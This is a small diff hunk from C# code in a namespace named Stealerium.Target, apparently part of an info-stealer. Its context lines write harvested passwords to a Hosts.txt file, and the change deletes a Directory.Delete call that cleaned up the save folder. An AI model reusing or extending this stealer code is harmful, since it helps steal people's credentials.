@@ -78,8 +78,6 @@ namespace Stealerium.Target
                     File.AppendAllText(sSavePath + "\\Hosts.txt", FormatPassword(p));
                 return;
             }
-
-            Directory.Delete(sSavePath);
         }
     }
 }
